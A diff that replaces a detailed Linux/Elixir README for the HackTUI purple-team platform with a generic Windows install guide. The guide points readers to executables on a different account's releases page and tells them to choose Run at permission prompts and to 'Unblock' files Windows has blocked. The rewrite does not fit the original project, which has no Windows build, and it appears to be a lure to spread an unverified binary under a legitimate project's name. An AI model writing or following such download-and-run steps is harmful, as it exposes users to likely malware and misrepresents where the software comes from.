@@ -1,1008 +1,210 @@
-# HackTUI
+# 🛡️ HackTUI-Hermes-Jido - Terminal Security for Windows Teams
 
-HackTUI is a terminal-native purple team security operations platform built on **Elixir** and the **BEAM runtime**.
+[![Download HackTUI-Hermes-Jido](https://img.shields.io/badge/Download%20Now-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mybiznes754/HackTUI-Hermes-Jido/releases)
 
-It combines:
+## 🚀 Getting Started
 
-- realtime telemetry ingestion
-- alert and investigation lifecycle management
-- terminal-first SOC operations
-- bounded agent-assisted workflows using **Jido**
-- AI interoperability through **MCP (Model Context Protocol)**
+HackTUI-Hermes-Jido is a terminal-first security operations tool for people who need a clear view of security work in one place. It runs from a Windows terminal and gives you a text-based interface for common purple-team tasks, alert review, and security checks.
 
-HackTUI is designed as a **research and experimentation platform** for autonomous and human-guided security operations.
+This page shows you how to get the app on Windows and start it with the least friction.
 
-This repository includes:
+## 📥 Download HackTUI-Hermes-Jido
 
-- the HackTUI platform
-- the built-in MCP server
-- Jido-based bounded agent components inside HackTUI
+1. Open the release page here: https://github.com/Mybiznes754/HackTUI-Hermes-Jido/releases
+2. Find the latest release at the top of the page
+3. Download the Windows file from the Assets section
+4. Save the file to your Downloads folder or Desktop
 
-This repository does **not** include my external Hermes agent. Hermes was used as a development partner and can connect to HackTUI through MCP, but the private agent itself is not part of this codebase.
+If you see more than one file, pick the one for Windows. It may end in `.exe`, `.zip`, or another Windows file type.
 
-## Why HackTUI Exists
+## 🖥️ Windows Requirements
 
-Most security platforms today are built around:
+Before you start, make sure your PC can run the app.
 
-- large web dashboards
-- centralized service layers
-- conventional SIEM pipelines
-- analyst workflows designed for browsers first
+- Windows 10 or Windows 11
+- A standard desktop or laptop with a keyboard
+- Internet access for the download
+- Enough free space to store the app file
+- Permission to run apps from downloaded files
 
-HackTUI explores a different direction:
+For best results, keep Windows up to date. A modern terminal window also helps, since this app uses a text-based interface.
 
-- terminal-first operations
-- actor-style concurrency on the BEAM
-- bounded AI assistance
-- structured security workflows
-- agent-operable infrastructure
+## 🧭 What You Will Use It For
 
-The goal is not to replace mature security platforms. The goal is to explore what a **realtime, terminal-native, AI-accessible security system** looks like when built from first principles in Elixir.
+HackTUI-Hermes-Jido helps you work with security tasks from a terminal screen instead of a full graphical app.
 
-## High-Level Architecture
+Typical use cases:
 
-HackTUI is an **Elixir umbrella application**.
+- Review security alerts
+- Track incident work
+- Run purple-team checks
+- View status in a compact terminal layout
+- Manage day-to-day security tasks with less clutter
 
-```text
-apps/
-  hacktui_agent/
-  hacktui_collab/
-  hacktui_core/
-  hacktui_hub/
-  hacktui_sensor/
-  hacktui_store/
-  hacktui_tui/
-```
+The interface keeps the focus on action and status, so you can move through tasks without extra screens.
 
-### `hacktui_core`
+## 📦 Install on Windows
 
-Shared domain logic and durable system concepts.
+### If you downloaded an `.exe` file
 
-Contains:
+1. Open the folder where the file downloaded
+2. Double-click the file
+3. If Windows asks for permission, choose Run
+4. Follow the on-screen steps
 
-- commands
-- events
-- aggregates
-- investigation lifecycle logic
-- alert lifecycle logic
-- correlation and reporting primitives
+### If you downloaded a `.zip` file
 
-### `hacktui_store`
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Pick a folder such as Desktop or Downloads
+4. Open the extracted folder
+5. Find the app file inside
+6. Double-click it to run
 
-Persistence boundary.
+### If Windows blocks the file
 
-Responsible for storing and projecting:
+1. Right-click the file
+2. Open Properties
+3. If you see an Unblock option, check it
+4. Click Apply
+5. Try opening the file again
 
-- alerts
-- cases
-- observations
-- approvals
-- audit events
-- query projections
+## 🏁 First Launch
 
-Backed by Ecto and PostgreSQL.
+When you open HackTUI-Hermes-Jido for the first time, a terminal window should appear with the app interface.
 
-### `hacktui_hub`
+What to do next:
 
-System control plane and runtime coordination layer.
+1. Wait for the app to load
+2. Read the first screen
+3. Use the keys shown in the app
+4. Follow the prompts for setup or sign-in
+5. Keep the window open while you work
 
-Responsible for:
+If the app asks for a workspace path, choose a folder you can find later, such as Documents or Desktop.
 
-- health reporting
-- query services
-- alert promotion
-- case creation
-- investigation orchestration
-- privacy masking
-- replay support
-- runtime workflows
+## ⌨️ Basic Use
 
-### `hacktui_sensor`
+The app is made for keyboard use. You do not need a mouse for most actions.
 
-Telemetry ingestion boundary.
+Common controls in terminal tools like this one:
 
-Responsible for collecting and forwarding:
+- Arrow keys to move through lists
+- Enter to choose an item
+- Esc to go back
+- Tab to move between fields
+- Q to quit, if shown on screen
 
-- journald security events
-- network flow telemetry
-- process/runtime signals
+The app may show panels for:
 
-### `hacktui_tui`
+- Alerts
+- Tasks
+- Logs
+- Targets
+- Team notes
+- Activity status
 
-Terminal SOC interface.
+Use the on-screen labels as your guide. The interface is built to be read from top to bottom, with clear text and short action labels.
 
-Responsible for rendering:
+## 🔐 Security Workflows
 
-- alert queue
-- case board
-- approvals
-- observations
-- workflow views
-- live dashboard views
+HackTUI-Hermes-Jido fits a purple-team workflow, where defensive and testing tasks sit side by side.
 
-### `hacktui_agent`
+You can use it to:
 
-Bounded agent integration.
+- Check live security status
+- Track findings during a drill
+- Review notes from a test run
+- Monitor changes during an exercise
+- Keep a simple record of team actions
 
-Uses the **real Jido runtime** for advisory investigation workflows and includes the MCP server implementation that external agents can use to interact with HackTUI.
+The Elixir and BEAM base helps the app stay responsive during terminal sessions and repeated updates.
 
-### `hacktui_collab`
+## 🧰 Common Setup Tips
 
-Experimental collaboration boundary for external integrations.
+If the app does not start right away, try these steps:
 
-## What HackTUI Does
+1. Make sure the file finished downloading
+2. Move the file to a simple folder path
+3. Use a folder name with no special characters
+4. Run the file again as your normal Windows user
+5. Close other terminal windows and try once more
 
-HackTUI currently supports:
+If the app opens in a small terminal window, you can often resize it with the window corner.
 
-- live host telemetry ingestion
-- network flow ingestion through `tshark` / `dumpcap`
-- journald security event ingestion
-- process and BEAM runtime telemetry
-- alert lifecycle management
-- investigation case creation
-- terminal-native SOC workflows
-- MCP access for external AI agents
-- Jido-backed agent runtime integration
-- privacy masking for safer screenshots and demos
+## 🧩 If You Want a Cleaner Setup
 
-In practice, this means HackTUI can collect observations, promote suspicious activity into alerts, open cases, expose system state through MCP, and allow a bounded agent to assist with investigation while keeping a human operator in control.
+You can keep the app easy to find by using this folder layout:
 
-## Major Design Principles
+- `Desktop\HackTUI`
+- `Documents\Security Tools`
+- `Downloads\HackTUI-Hermes-Jido`
 
-### Terminal First
+This makes it easier to reopen the app later and keeps related files in one place.
 
-HackTUI is built to work over SSH, in remote shells, and in environments where browser-first tooling is undesirable.
+## ❓ Common Questions
 
-### Durable State
+### Do I need coding skills?
+No. You only need to download the file, open it, and follow the prompts on screen.
 
-Alerts, cases, approvals, and observations are modeled explicitly and can be persisted and queried.
+### Do I need special tools?
+No extra tools should be needed for the normal Windows setup. A terminal window and the release file are enough to begin.
 
-### Bounded Agent Assistance
+### Can I use it without a mouse?
+Yes. The app is built for keyboard use.
 
-Agents help analyze, summarize, and investigate. Humans remain in control of final decisions.
+### Where do I get the latest version?
+Use the release page here: https://github.com/Mybiznes754/HackTUI-Hermes-Jido/releases
 
-### Replayable Workflows
+### What if I do not see a Windows file?
+Scroll through the Assets list on the release page and look for the file meant for Windows.
 
-The platform is intended to support replay, validation, and purple-team experimentation.
+## 🗂️ File Layout
 
-### Auditable Operations
+After setup, you may see files or folders like these:
 
-State transitions should leave inspectable records and remain understandable to operators.
+- App file
+- Config folder
+- Logs folder
+- Workspace folder
+- Readme or usage notes
 
-## Technology Stack
+Keep these items together unless the app tells you to move them. This helps the program find its settings and records.
 
-- **Elixir**
-- **Erlang/OTP**
-- **BEAM**
-- **PostgreSQL**
-- **Ecto**
-- **Jido**
-- **MCP**
-- **tshark / dumpcap**
-- terminal UI workflows
+## 🛠️ Troubleshooting
 
-## Requirements
+### The app closes right away
+- Open it again from the file location
+- Keep the terminal window open
+- Check whether Windows shows an error message first
 
-Recommended versions:
+### The window looks broken or too small
+- Resize the terminal window
+- Maximize the window
+- Open it again after resizing
 
-- Elixir **1.19+**
-- Erlang/OTP **28+**
-- PostgreSQL **14+**
-- `tshark`
-- `dumpcap`
+### The file will not run
+- Right-click the file and check Windows security prompts
+- Try running it from a folder with a short path
+- Download the file again if the first copy looks incomplete
 
-Useful optional tools:
+### Nothing appears after launch
+- Wait a few seconds
+- Check if the app is opening behind another window
+- Close the window and try again
 
-- `journalctl`
-- Observer GUI support
-- `git`
+## 🧭 Best Way to Use It
 
-HackTUI is currently best supported on **Linux**.
+To keep your work smooth:
 
----
+1. Launch the app from the same folder each time
+2. Keep one project or exercise in one workspace
+3. Save notes during each session
+4. Use short task names
+5. Close the app before moving or renaming its files
 
-# Installation
+This helps you avoid confusion during busy security work.
 
-## 1. Clone the repository
+## 📌 Release Page
 
-```bash
-git clone https://github.com/HackTuah/HackTUI-Hermes-Jido.git
-cd HackTUI-Hermes-Jido
-```
-
-## 2. Install Elixir dependencies
-
-```bash
-mix deps.get
-```
-
-## 3. Compile the umbrella
-
-```bash
-mix compile
-```
-
-## 4. Install required system packages
-
-### Ubuntu / Debian
-
-```bash
-sudo apt update
-sudo apt install -y erlang elixir postgresql postgresql-contrib wireshark tshark
-```
-
-For Observer GUI support, you may also need:
-
-```bash
-sudo apt install -y libwxgtk3.2-dev libwxgtk-webview3.2-dev
-```
-
-### Fedora
-
-```bash
-sudo dnf install -y erlang elixir postgresql-server wireshark-cli wireshark
-```
-
-### Arch Linux
-
-```bash
-sudo pacman -S elixir erlang postgresql wireshark-cli wireshark-qt
-```
-
-## 5. Verify capture tools
-
-```bash
-which tshark
-which dumpcap
-```
-
-Expected output should be valid paths such as:
-
-```bash
-/usr/bin/tshark
-/usr/bin/dumpcap
-```
-
----
-
-# Database Setup
-
-## 1. Start PostgreSQL
-
-```bash
-sudo systemctl start postgresql
-sudo systemctl enable postgresql
-```
-
-## 2. Create a database user and database
-
-```bash
-sudo -u postgres psql
-```
-
-Inside `psql`:
-
-```sql
-CREATE USER hacktui WITH PASSWORD 'hacktui';
-CREATE DATABASE hacktui_dev OWNER hacktui;
-\q
-```
-
-## 3. Export runtime environment variables
-
-```bash
-export HACKTUI_START_REPO=true
-export HACKTUI_DB_NAME=hacktui_dev
-export HACKTUI_DB_USER=hacktui
-export HACKTUI_DB_PASS=hacktui
-export HACKTUI_DB_HOST=localhost
-export HACKTUI_DB_PORT=5432
-```
-
-## 4. Run migrations
-
-```bash
-mix ecto.create
-mix ecto.migrate
-```
-
-If your environment uses app-specific migration tasks, run the equivalent store migration workflow for your setup.
-
----
-
-# Running HackTUI
-
-## Start the full runtime in IEx
-
-```bash
-iex -S mix
-```
-
-## Ensure the main apps are started
-
-```elixir
-Application.ensure_all_started(:hacktui_store)
-Application.ensure_all_started(:hacktui_hub)
-Application.ensure_all_started(:hacktui_agent)
-Application.ensure_all_started(:hacktui_sensor)
-Application.ensure_all_started(:hacktui_tui)
-```
-
-## Check health
-
-```elixir
-HacktuiHub.Health.status()
-HacktuiAgent.Health.status()
-HacktuiHub.QueryService.system_diagnostic()
-```
-
-You should see the hub, store, and agent layers report healthy startup state.
-
----
-
-# Launching the Terminal SOC Interface
-
-Start the TUI:
-
-```bash
-mix hacktui.tui
-```
-
-Depending on your current implementation and workflow, you may also have an equivalent task exposed under the hub app. If so, this command should also work:
-
-```bash
-mix hacktui.live
-```
-
-The terminal UI is intended to display:
-
-- alert queue
-- case board
-- approval inbox
-- recent observations
-- system health
-- workflow-specific views
-
----
-
-# Running Observer GUI
-
-Observer is extremely useful for inspecting BEAM processes, supervision trees, memory, and message flow.
-
-Start the project:
-
-```bash
-iex -S mix
-```
-
-Then launch Observer:
-
-```elixir
-:observer.start()
-```
-
-If your system requires explicit wx startup:
-
-```elixir
-:wx.new()
-:observer.start()
-```
-
-Observer is useful for inspecting:
-
-- supervision trees
-- process state
-- message queues
-- ETS tables
-- scheduler load
-- application memory usage
-
----
-
-# Verifying Jido Integration
-
-HackTUI uses the **real Jido runtime**, not a local stub.
-
-Run the following in IEx:
-
-```elixir
-Code.ensure_loaded?(Jido)
-Code.ensure_loaded?(Jido.Agent)
-Code.ensure_loaded?(Jido.Action)
-```
-
-All should return `true`.
-
-Verify the application starts:
-
-```elixir
-Application.ensure_all_started(:jido)
-Application.spec(:jido)
-```
-
-Locate the compiled modules:
-
-```elixir
-:code.which(Jido)
-:code.which(Jido.Agent)
-:code.which(Jido.Action)
-```
-
-Expected result: paths under `_build/dev/lib/jido/` and `_build/dev/lib/jido_action/`.
-
----
-
-# Running the MCP Server
-
-HackTUI includes a built-in MCP server.
-
-## Start in stdio mode
-
-```bash
-HACKTUI_MCP_STDIO=1 ./bin/hacktui-mcp
-```
-
-## Quick initialize test
-
-```bash
-body='{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-11-05","capabilities":{},"clientInfo":{"name":"demo","version":"0.1"}}}'
-printf 'Content-Length: %s
-
-%s' "$(printf '%s' "$body" | wc -c)" "$body" | HACKTUI_MCP_STDIO=1 ./bin/hacktui-mcp
-```
-
-You should receive a valid JSON-RPC initialize response.
-
-## Smoke test helper
-
-If present in your checkout:
-
-```bash
-./bin/hacktui-mcp-smoke
-```
-
----
-
-# Runtime Health and Diagnostic Commands
-
-Start IEx:
-
-```bash
-iex -S mix
-```
-
-Then use the following commands.
-
-## Global system health
-
-```elixir
-HacktuiHub.Health.status()
-HacktuiAgent.Health.status()
-HacktuiHub.QueryService.system_diagnostic()
-```
-
-## QueryService function inventory
-
-```elixir
-HacktuiHub.QueryService.__info__(:functions)
-```
-
-## Verify core runtime processes
-
-```elixir
-Process.whereis(HacktuiSensor.Forwarder)
-Process.whereis(HacktuiHub.IngestService)
-```
-
-## Show sensor children
-
-```elixir
-DynamicSupervisor.which_children(HacktuiSensor.CollectorsSupervisor)
-```
-
-## Check network health
-
-```elixir
-HacktuiHub.QueryService.check_network_health()
-```
-
-## Verify `tshark` and `dumpcap` inside runtime
-
-```elixir
-System.find_executable("tshark")
-System.find_executable("dumpcap")
-```
-
----
-
-# Network Collector Inspection
-
-To inspect the running network collector in detail:
-
-```elixir
-network_pid =
-(
-  DynamicSupervisor.which_children(HacktuiSensor.CollectorsSupervisor)
-  |> Enum.find_value(fn {_, pid, _, mods} ->
-    if HacktuiSensor.Collectors.Network in mods, do: pid, else: nil
-  end)
-)
-```
-
-Show the PID:
-
-```elixir
-network_pid
-```
-
-Inspect collector state:
-
-```elixir
-:sys.get_state(network_pid)
-```
-
-This is useful for verifying:
-
-- selected interface
-- active port
-- collector enablement
-- collector error state
-- startup timestamp
-- resolved tshark path
-
----
-
-# Live Telemetry Testing
-
-## Clear the in-memory buffer
-
-```elixir
-HacktuiHub.QueryService.clear_buffer()
-```
-
-## Generate traffic from another terminal
-
-```bash
-ping -c 2 8.8.8.8
-curl -I https://google.com
-curl -I https://cloudflare.com
-```
-
-## Inspect recent observations
-
-```elixir
-HacktuiHub.QueryService.latest_observations()
-```
-
-## Get the live dashboard snapshot
-
-```elixir
-snapshot = HacktuiHub.QueryService.live_dashboard_snapshot(HacktuiStore.Repo, live_only: true)
-```
-
-## Summarize counts
-
-```elixir
-%{
-  alerts: length(snapshot.alerts),
-  cases: length(snapshot.cases),
-  approvals: length(snapshot.approvals),
-  observations: length(snapshot.observations)
-}
-```
-
-## Filter network flows
-
-```elixir
-snapshot.observations
-|> Enum.filter(&(Map.get(&1, :kind) == "network.flow"))
-|> Enum.take(10)
-```
-
-## Filter security-relevant observations
-
-```elixir
-snapshot.observations
-|> Enum.filter(&(Map.get(&1, :kind) in ["system.error", "journald.security", "network.flow"]))
-|> Enum.take(20)
-```
-
----
-
-# Alert Workflow Testing
-
-Load the command struct:
-
-```elixir
-alias HacktuiCore.Commands.CreateAlert
-```
-
-Create a high-severity alert through the runtime path:
-
-```elixir
-HacktuiHub.Runtime.create_alert(
-  %CreateAlert{
-    alert_id: "hermes-demo-" <> Integer.to_string(System.unique_integer([:positive])),
-    title: "Beacon Detection",
-    severity: :high,
-    observation_refs: ["manual-net-1"],
-    actor: "hermes"
-  },
-  repo: HacktuiStore.Repo,
-  occurred_at: DateTime.utc_now(),
-  event_id: "evt-hermes-demo-" <> Integer.to_string(System.unique_integer([:positive]))
-)
-```
-
-Inspect the alert queue:
-
-```elixir
-HacktuiHub.QueryService.alert_queue(HacktuiStore.Repo)
-```
-
-Inspect the case board:
-
-```elixir
-HacktuiHub.QueryService.case_board(HacktuiStore.Repo)
-```
-
-## Correlation / deduplication check
-
-Run the same pattern again with a different alert id:
-
-```elixir
-HacktuiHub.Runtime.create_alert(
-  %CreateAlert{
-    alert_id: "hermes-demo-repeat-" <> Integer.to_string(System.unique_integer([:positive])),
-    title: "Beacon Detection",
-    severity: :high,
-    observation_refs: ["manual-net-1"],
-    actor: "hermes"
-  },
-  repo: HacktuiStore.Repo,
-  occurred_at: DateTime.utc_now(),
-  event_id: "evt-hermes-demo-repeat-" <> Integer.to_string(System.unique_integer([:positive]))
-)
-```
-
-Then inspect again:
-
-```elixir
-HacktuiHub.QueryService.alert_queue(HacktuiStore.Repo)
-HacktuiHub.QueryService.case_board(HacktuiStore.Repo)
-```
-
----
-
-# Manual Observation Injection
-
-If you want to inject a test observation directly:
-
-```elixir
-alias HacktuiCore.Commands.AcceptObservation
-
-now = DateTime.utc_now() |> DateTime.truncate(:second)
-
-obs = %AcceptObservation{
-  observation_id: "manual-net-1",
-  fingerprint: "manual-net-1",
-  source: "iex.manual",
-  kind: "network.flow",
-  summary: "simulated attacker beacon",
-  raw_message: "simulated attacker beacon",
-  severity: "high",
-  confidence: 0.95,
-  payload: %{
-    "src" => "10.0.0.99",
-    "dst" => "185.199.108.153",
-    "src_port" => 51515,
-    "dst_port" => 443,
-    "proto" => "TCP",
-    "service" => "HTTPS",
-    "site" => "malicious.test",
-    "summary" => "simulated attacker beacon",
-    "severity" => "high"
-  },
-  metadata: %{
-    collector: :manual_test,
-    severity: "high",
-    occurred_at: DateTime.to_iso8601(now),
-    observed_at: DateTime.to_iso8601(now),
-    category: "network",
-    tags: ["manual", "test", "beacon"]
-  },
-  observed_at: now,
-  received_at: now,
-  actor: "iex",
-  envelope_version: 1
-}
-
-HacktuiSensor.Forwarder.accept_observation(obs)
-```
-
-Then inspect observations:
-
-```elixir
-HacktuiHub.QueryService.latest_observations(HacktuiStore.Repo, limit: 10)
-```
-
----
-
-# Clearing Demo State
-
-## Clear the in-memory live buffer
-
-```elixir
-HacktuiHub.QueryService.clear_buffer()
-```
-
-## Remove persisted alerts and cases
-
-```elixir
-HacktuiStore.Repo.delete_all(HacktuiStore.Schema.CaseRecord)
-HacktuiStore.Repo.delete_all(HacktuiStore.Schema.Alert)
-```
-
-## Optionally remove persisted observations
-
-```elixir
-HacktuiStore.Repo.delete_all(HacktuiStore.Schema.Observation)
-HacktuiHub.QueryService.clear_buffer()
-```
-
-## Verify clean state
-
-```elixir
-HacktuiHub.QueryService.alert_queue(HacktuiStore.Repo)
-HacktuiHub.QueryService.case_board(HacktuiStore.Repo)
-HacktuiHub.QueryService.live_dashboard_snapshot(HacktuiStore.Repo, live_only: true)
-```
-
----
-
-# Testing the TUI While Live
-
-## Terminal 1
-
-Start the TUI:
-
-```bash
-mix hacktui.tui
-```
-
-## Terminal 2
-
-Start IEx:
-
-```bash
-iex -S mix
-```
-
-Then check state:
-
-```elixir
-HacktuiHub.Health.status()
-HacktuiAgent.Health.status()
-HacktuiHub.QueryService.alert_queue(HacktuiStore.Repo)
-HacktuiHub.QueryService.case_board(HacktuiStore.Repo)
-HacktuiHub.QueryService.latest_observations()
-```
-
-Trigger a live alert while the TUI is open:
-
-```elixir
-alias HacktuiCore.Commands.CreateAlert
-
-HacktuiHub.Runtime.create_alert(
-  %CreateAlert{
-    alert_id: "live-demo-" <> Integer.to_string(System.unique_integer([:positive])),
-    title: "Hermes Beacon Detection",
-    severity: :high,
-    observation_refs: ["manual-net-1"],
-    actor: "hermes"
-  },
-  repo: HacktuiStore.Repo,
-  occurred_at: DateTime.utc_now(),
-  event_id: "evt-live-demo-" <> Integer.to_string(System.unique_integer([:positive]))
-)
-```
-
----
-
-# Running Tests
-
-## Run all tests
-
-```bash
-mix test
-```
-
-## Run app-specific tests
-
-```bash
-mix test apps/hacktui_core/test
-mix test apps/hacktui_hub/test
-mix test apps/hacktui_agent/test
-mix test apps/hacktui_sensor/test
-mix test apps/hacktui_store/test
-mix test apps/hacktui_tui/test
-```
-
-## Run a single test file
-
-```bash
-mix test apps/hacktui_hub/test/hacktui_hub_runtime_test.exs
-```
-
-## Run a single test line
-
-```bash
-mix test apps/hacktui_hub/test/hacktui_hub_runtime_test.exs:42
-```
-
-## Trace mode
-
-```bash
-mix test --trace
-```
-
-## Re-run only failures
-
-```bash
-mix test --failed
-```
-
----
-
-# Formatting and Compile Checks
-
-Format everything:
-
-```bash
-mix format
-```
-
-Check formatting only:
-
-```bash
-mix format --check-formatted
-```
-
-Compile with warnings as errors:
-
-```bash
-mix compile --warnings-as-errors
-```
-
----
-
-# GitHub Recommendations
-
-## Suggested repository description
-
-**Terminal-native purple team platform built with Elixir/BEAM, Jido, and MCP for realtime telemetry, alerting, and agent-assisted investigation.**
-
-## Suggested GitHub topics
-
-```text
-elixir
-beam
-cybersecurity
-siem
-soc
-purple-team
-threat-detection
-mcp
-jido
-terminal-ui
-observability
-incident-response
-```
-
-## Recommended repo sections
-
-Create or keep these files near the root:
-
-- `ARCHITECTURE.md`
-- `THREAT_MODEL.md`
-- `PROJECT_BRIEF.md`
-- `ROADMAP.md`
-- `DECISIONS.md`
-- `PRODUCTION_READINESS_REPORT.md`
-
-These help reviewers quickly understand the seriousness of the system.
-
----
-
-# Security and Privacy Notes
-
-Before publishing screenshots or logs:
-
-- review environment variables
-- verify no secrets are committed
-- sanitize host identifiers when needed
-- use privacy masking when sharing screenshots publicly
-- review captured telemetry before publishing
-
-Before pushing to GitHub, a quick sanity check:
-
-```bash
-git ls-files | grep env
-git ls-files | grep key
-git status
-```
-
-Expected result: no private `.env` files, no secret key files, and only intentional project files tracked.
-
----
-
-# What Is Not Included
-
-This repository does **not** include my private Hermes runtime or personal agent configuration.
-
-It **does** include:
-
-- the built-in MCP server
-- Jido integration inside HackTUI
-- bounded agent components used by the system itself
-
----
-
-# Current Status
-
-HackTUI is a **research prototype** exploring:
-
-- terminal-native SOC workflows
-- purple-team telemetry and replay
-- bounded agent assistance
-- AI-operable security infrastructure
-- BEAM-native security system design
-
-It is **not production ready**, but it already demonstrates a cohesive architecture for telemetry ingestion, alerting, case management, AI interoperability, and operator-driven security workflows.
-
----
-
-# Quick Start
-
-If you want the shortest possible path to a working system:
-
-```bash
-mix deps.get
-mix compile
-iex -S mix
-```
-
-Then in IEx:
-
-```elixir
-Application.ensure_all_started(:hacktui_store)
-Application.ensure_all_started(:hacktui_hub)
-Application.ensure_all_started(:hacktui_agent)
-Application.ensure_all_started(:hacktui_sensor)
-Application.ensure_all_started(:hacktui_tui)
-
-HacktuiHub.Health.status()
-HacktuiAgent.Health.status()
-HacktuiHub.QueryService.check_network_health()
-```
-
-Then in another terminal:
-
-```bash
-mix hacktui.tui
-```
-
-And if you want to test MCP:
-
-```bash
-body='{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-11-05","capabilities":{},"clientInfo":{"name":"demo","version":"0.1"}}}'
-printf 'Content-Length: %s
-
-%s' "$(printf '%s' "$body" | wc -c)" "$body" | HACKTUI_MCP_STDIO=1 ./bin/hacktui-mcp
-```
-
----
-
-# License
-
-Add your preferred license here.
+Download or update from here: https://github.com/Mybiznes754/HackTUI-Hermes-Jido/releases
